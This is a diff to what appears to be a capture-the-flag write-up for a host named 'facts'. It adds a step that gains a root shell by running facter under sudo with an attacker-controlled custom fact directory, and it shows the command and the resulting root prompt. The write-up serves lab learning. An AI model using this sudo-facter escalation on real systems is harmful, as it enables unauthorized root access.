@@ -1201,6 +1201,14 @@ Breakdown:
 </div>
 
 ### 4.2 Execution and Root Shell Capture
+
+Command: `sudo facter --custom-dir=/home/trivia nyorosha`
+
+```shell
+trivia@facts:~$ sudo facter --custom-dir=/home/trivia nyorosha
+root@facts:/home/trivia# 
+```
+
 <div align="center">
 <br>
 <br>
